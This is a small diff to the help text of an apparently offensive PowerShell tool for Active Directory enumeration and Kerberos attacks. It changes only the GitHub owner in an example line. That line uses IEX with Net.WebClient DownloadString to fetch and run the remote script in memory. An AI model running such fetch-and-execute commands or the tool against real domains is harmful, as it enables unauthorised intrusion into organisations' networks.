@@ -8,7 +8,7 @@ Comprehensive AD enumeration tool with BloodHound integration, Kerberos attacks,
 share enumeration, and domain analysis capabilities.
 
 .EXAMPLE
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChickenLoner/Invoke-BigBlackAD/main/Invoke-BigBlackAD.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Sabastiaz/Invoke-BigBlackAD/main/Invoke-BigBlackAD.ps1')
 Invoke-BigBlackAD -FullEnumeration
 
 .NOTES
